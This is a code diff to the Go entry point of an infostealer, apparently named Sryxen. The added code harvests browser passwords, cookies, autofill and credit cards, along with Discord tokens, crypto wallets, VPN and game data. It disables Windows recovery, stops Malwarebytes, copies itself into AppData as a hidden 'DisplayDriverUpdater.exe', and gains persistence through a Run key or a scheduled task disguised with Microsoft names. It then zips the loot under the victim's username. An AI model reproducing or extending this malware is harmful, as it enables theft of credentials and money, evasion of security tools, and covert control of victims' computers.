@@ -2,22 +2,24 @@ package main
 
 import (
 	"encoding/json"
+	"archive/zip"
+	"errors"
 	"fmt"
 	"os"
 	"os/exec"
 	"path/filepath"
-	"sync"
-	"strings"
+	"sryxen/banking"
+	"sryxen/games"
+	"sryxen/socials"
 	"sryxen/target"
 	"sryxen/utils"
-	"sryxen/socials"
-	"sryxen/banking"
 	"sryxen/vpn"
-	"errors"
+	"strings"
 	"syscall"
+	"io"
+
 	"golang.org/x/sys/windows"
-	"sryxen/games"
-	"sryxen/antivm"
+	"golang.org/x/sys/windows/registry"
 )
 
 var browsers = []string{
@@ -47,53 +49,46 @@ func saveStringToFile(path string, data []string) error {
 	return nil
 }
 
+func IsAdmin() bool {
+	ret, _, _ := syscall.NewLazyDLL("shell32.dll").NewProc("IsUserAnAdmin").Call()
+	return ret != 0
+}
+
 func grabGecko(BROWSERS *utils.Browsers, outputDir string) {
 	browsers, _ := utils.DiscoverGecko()
 	for _, browser := range browsers {
 		password, err := target.GetGeckoPasswords(browser)
-		if err != nil || len(password) == 0 {
-
-			} else {
+		if err == nil && len(password) > 0 {
 			BROWSERS.Passwords = append(BROWSERS.Passwords, password...)
 			saveStringToFile(filepath.Join(outputDir, "gecko", "passwords.txt"), convertPasswordsToStrings(password))
 		}
 
 		cookie, err := target.GetGeckoCookies(browser)
-		if err != nil || len(cookie) == 0 {
-
-			} else {
+		if err == nil && len(cookie) > 0 {
 			BROWSERS.Cookies = append(BROWSERS.Cookies, cookie...)
 			saveStringToFile(filepath.Join(outputDir, "gecko", "cookies.txt"), convertCookiesToStrings(cookie))
 		}
 
 		history, err := target.GetGeckoHistory(browser)
-		if err != nil || len(history) == 0 {
-
-			} else {
+		if err == nil && len(history) > 0 {
 			BROWSERS.History = append(BROWSERS.History, history...)
 			saveStringToFile(filepath.Join(outputDir, "gecko", "history.txt"), convertHistoryToStrings(history))
 		}
 
 		autofill, err := target.GetGeckoAutofill(browser)
-		if err != nil || len(autofill) == 0 {
-
-		} else {
+		if err == nil && len(autofill) > 0 {
 			BROWSERS.AutoFill = append(BROWSERS.AutoFill, autofill...)
 			saveStringToFile(filepath.Join(outputDir, "gecko", "autofill.txt"), convertAutofillToStrings(autofill))
 		}
 
 		download, err := target.GetGeckoDownloads(browser)
-		if err != nil || len(download) == 0 {
-
-		} else {
+		if err == nil && len(download) > 0 {
 			BROWSERS.Download = append(BROWSERS.Download, download...)
 			saveStringToFile(filepath.Join(outputDir, "gecko", "downloads.txt"), convertDownloadsToStrings(download))
 		}
 
 		card, err := target.GetGeckoCreditCards(browser)
-		if err != nil || len(card) == 0 {
-
-		} else {
+		if err == nil && len(card) > 0 {
 			BROWSERS.CreditCard = append(BROWSERS.CreditCard, card...)
 			saveStringToFile(filepath.Join(outputDir, "gecko", "creditcards.txt"), convertCreditCardsToStrings(card))
 		}
@@ -193,14 +188,139 @@ func IsAlreadyRunning() bool {
 	return err != nil
 }
 
+func createRegistryPersistence(path string) {
+	k, err := registry.OpenKey(registry.CURRENT_USER, `SOFTWARE\Microsoft\Windows\CurrentVersion\Run`, registry.ALL_ACCESS)
+	if err != nil {
+		fmt.Println("Error opening registry key", err)
+		return
+	}
+	defer k.Close()
+
+	_, _, err = k.GetStringValue("Microsoft Display Driver Manager")
+	if err != nil {
+		err = k.SetStringValue("Microsoft Display Driver Manager", path)
+		if err != nil {
+			fmt.Println(err)
+			return
+		}
+	}
+}
+
+func createScheduledTaskPersistence(path string) {
+	cmd := exec.Command("schtasks.exe", "/create", "/tn", "Microsoft Defender Threat Intelligence Handler", "/sc", "ONLOGON", "/tr", path, "/rl", "HIGHEST")
+	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
+	cmd.Run()
+}
+
+func zipDirectory(sourceDir, zipFile string) error {
+	zipOut, err := os.Create(zipFile)
+	if err != nil {
+		return fmt.Errorf("could not create zip file: %v", err)
+	}
+	defer zipOut.Close()
+
+	zipWriter := zip.NewWriter(zipOut)
+	defer zipWriter.Close()
+
+	err = filepath.Walk(sourceDir, func(filePath string, info os.FileInfo, err error) error {
+		if err != nil {
+			return err
+		}
+
+		if !info.IsDir() {
+			relativePath, err := filepath.Rel(sourceDir, filePath)
+			if err != nil {
+				return err
+			}
+
+			zipFileWriter, err := zipWriter.Create(relativePath)
+			if err != nil {
+				return err
+			}
+
+			file, err := os.Open(filePath)
+			if err != nil {
+				return err
+			}
+			defer file.Close()
+
+			_, err = io.Copy(zipFileWriter, file)
+			if err != nil {
+				return err
+			}
+		}
+		return nil
+	})
+
+	return err
+}
+
+
 func main() {
 	if IsAlreadyRunning() {
 		return
 	}
-	AntiVm.AntiVMCheckAndExit()
+
+	if IsAdmin() {
+		err := exec.Command("reagentc.exe", "/disable").Run()
+		if err != nil {
+			fmt.Printf("Failed to run reagentc.exe: %v\n", err)
+		}
+
+		whatthesigma := os.Getenv("ProgramFiles") + `\Malwarebytes\Anti-Malware\malwarebytes_assistant.exe`
+		sigmaarg := "--stopservice"
+		erm := exec.Command(whatthesigma, sigmaarg)
+		err = erm.Run()
+		if err != nil {
+			fmt.Printf("Failed to stop Malwarebytes service: %v\n", err)
+		}
+	}
+
+	executablePath, err := os.Executable()
+	if err != nil {
+		fmt.Print(err)
+		return
+	}
+	newPath := filepath.Join(os.Getenv("APPDATA"), "DisplayDriverUpdater.exe")
+
+	if !strings.Contains(executablePath, "AppData") {
+		src, err := os.Open(executablePath)
+		if err != nil {
+			fmt.Print(err)
+			return
+		}
+		defer src.Close()
+
+		dest, err := os.Create(newPath)
+		if err != nil {
+			fmt.Print(err)
+			return
+		}
+		defer dest.Close()
+
+		_, err = io.Copy(dest, src)
+		if err != nil {
+			fmt.Print(err)
+			return
+		}
+	}
+
+	ptr, err := syscall.UTF16PtrFromString(newPath)
+	if err != nil {
+		fmt.Println(err)
+		return
+	}
+	err = syscall.SetFileAttributes(ptr, syscall.FILE_ATTRIBUTE_HIDDEN)
+	if err != nil {
+		fmt.Println(err)
+		return
+	}
+
+
 	for _, browser := range browsers {
 		exec.Command("taskkill", "/F", "/IM", browser).Run()
 	}
+
 	var BROWSERS utils.Browsers
 	var PC utils.PC
 
@@ -209,55 +329,76 @@ func main() {
 		return
 	}
 
-	var wg sync.WaitGroup
+	done := make(chan struct{}, 7)
 
-	wg.Add(1)
 	go func() {
-		defer wg.Done()
 		grabGecko(&BROWSERS, outputDir)
+		done <- struct{}{}
 	}()
-	
-	tokens, err := socials.GetDiscordTokens()
-	if err == nil {
-		saveStringToFile(filepath.Join(outputDir, "discord_tokens.txt"), tokens)
-	}
 
-	target.ChromiumFetch()
-	wg.Add(1)
 	go func() {
-		defer wg.Done()
+		socials.Run()
+		done <- struct{}{}
+	}()
+
+	go func() {
+		target.ChromiumFetch()
+		done <- struct{}{}
+	}()
+
+	go func() {
+		CryptoWallets.Run()
+		done <- struct{}{}
+	}()
+
+	go func() {
+		vpn.Run()
+		done <- struct{}{}
+	}()
+
+	go func() {
+		Games.Run()
+		done <- struct{}{}
+	}()
+
+	go func() {
 		PC, err = target.GetComputerSpecifications()
 		if err != nil {
+			done <- struct{}{}
 			return
 		}
+		done <- struct{}{}
 	}()
-	wg.Wait()
+
+	go func() {
+		tokens, err := socials.GetDiscordTokens()
+		if err == nil {
+			saveStringToFile(filepath.Join(outputDir, "discord_tokens.txt"), tokens)
+		}
+		done <- struct{}{}
+	}()
+
+	for i := 0; i < 7; i++ {
+		<-done
+	}
+
+	savePCSpecsToFile(outputDir, PC)
 	for _, browser := range browsers {
 		exec.Command("taskkill", "/F", "/IM", browser).Run()
 	}
-	savePCSpecsToFile(outputDir, PC)
+	userName := strings.ToLower(os.Getenv("USERNAME"))
+	zipFile := filepath.Join(os.TempDir(), fmt.Sprintf("%s.zip", userName))
 
-	defer func() {
-		if r := recover(); r != nil {
-		}
-	}()
-	socials.Run()
+	err = zipDirectory(outputDir, zipFile)
+	if err != nil {
+		return
+	}
 
-	defer func() {
-		if r := recover(); r != nil {
-		}
-	}()
-	CryptoWallets.Run()
+	fmt.Println("Temp directory zipped successfully:", zipFile)
 
-	defer func() {
-		if r := recover(); r != nil {
-		}
-	}()
-	vpn.Run()
-
-	defer func() {
-		if r := recover(); r != nil {
-		}
-	}()
-	Games.Run()
+	if IsAdmin() {
+		createScheduledTaskPersistence(newPath)
+	} else {
+		createRegistryPersistence(newPath)
+	}
 }
